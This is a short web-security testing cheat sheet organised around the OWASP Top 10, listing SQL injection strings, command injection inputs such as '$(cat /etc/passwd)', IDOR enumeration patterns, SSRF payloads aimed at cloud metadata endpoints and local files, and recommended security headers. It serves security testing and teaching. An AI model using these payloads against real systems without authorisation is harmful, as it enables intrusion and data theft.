# OWASP Top 10 - 2021 - Commands

## SQL Injection Detection

| Command | Description |
|---------|-------------|
| `' OR 1=1--` | Basic SQLi authentication bypass |
| `' UNION SELECT 1,2,3--` | UNION injection to determine column count |
| `' UNION SELECT @@version,2,3--` | Extract database version (MSSQL) |
| `' UNION SELECT database(),2,3--` | Extract database name (MySQL) |
| `' AND SLEEP(5)--` | Time-based blind SQLi (MySQL) |
| `' WAITFOR DELAY '0:0:5'--` | Time-based blind SQLi (MSSQL) |
| `admin'--` | Commenting out the rest of a query |
| `admin" --` | Double-quote based SQLi |

## Command Injection

| Command | Description |
|---------|-------------|
| `; ls` | Command injection with semicolon |
| `\| id` | Pipe-based command injection |
| `&& whoami` | AND-based command injection |
| `\`ls\`` | Backtick-based command injection |
| `$(cat /etc/passwd)` | Subshell-based command injection |

## IDOR Testing

| Format | Description |
|--------|-------------|
| `/user/1` -> `/user/2` | Increment numeric IDs |
| `/file/doc001.pdf` -> `/file/doc002.pdf` | Enumerate predictable filenames |
| `/api/v1/users/me` -> `/api/v1/users/admin` | Modify usernames in endpoints |
| `/download?id=123` -> `/download?id=124` | Modify parameter values |

## SSRF Testing

| Payload | Description |
|---------|-------------|
| `http://127.0.0.1:8080/admin` | Access internal services on localhost |
| `http://169.254.169.254/latest/meta-data/` | AWS metadata endpoint |
| `http://metadata.google.internal/` | Google Cloud metadata endpoint |
| `file:///etc/passwd` | Read local files via SSRF |
| `gopher://internal-server:6379/_*` | SSRF to Redis with gopher protocol |

## Common Security Headers

| Header | Description |
|--------|-------------|
| `Strict-Transport-Security: max-age=31536000` | Enforce HTTPS connections |
| `Content-Security-Policy: default-src 'self'` | Control resource loading sources |
| `X-Frame-Options: DENY` | Prevent clickjacking |
| `X-Content-Type-Options: nosniff` | Prevent MIME type sniffing |
| `Referrer-Policy: no-referrer` | Control referrer information |
| `Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax` | Secure cookie attributes |
